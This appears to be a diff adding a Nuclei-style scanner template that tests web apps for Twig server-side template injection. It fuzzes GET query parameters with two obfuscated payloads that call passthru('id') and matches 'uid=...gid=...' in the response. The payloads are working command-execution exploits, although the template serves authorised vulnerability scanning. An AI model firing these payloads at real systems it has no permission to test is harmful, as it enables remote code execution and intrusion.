@@ -1,0 +1,39 @@
+id: twig-ssti
+
+info:
+  name: Twig - Server Side Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    Twig, a PHP template engine, posed significant challenges in crafting a working payload due to its built-in and default configurations, particularly in string creation. However, by utilizing the block feature and the built-in _charset variable, Attacker successfully developed a payload by nesting these elements together.
+  reference:
+    - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+  metadata:
+    max-request: 1
+  tags: twig,ssti,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{%block%20U%}id000passthru{%endblock%}{%set%20x=block(_charset%7Cfirst)%7Csplit(000)%}{{[x%7Cfirst]%7Cmap(x%7Clast)%7Cjoin}}"
+        - "{{id~passthru~_context%7Cjoin%7Cslice(2,2)%7Csplit(000)%7Cmap(_context%7Cjoin%7Cslice(5,8))}}"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
+# digest: 4a0a00473045022038c37af028c810b23e4b0542e444a1bc290532dee475beb64dadc6bcbac927dc022100949f3a90b6c1b00a16cfc2fa7008923a849765f68ae097c726d64f00f289c79f:922c64590222798bb761d5b6d8e72950
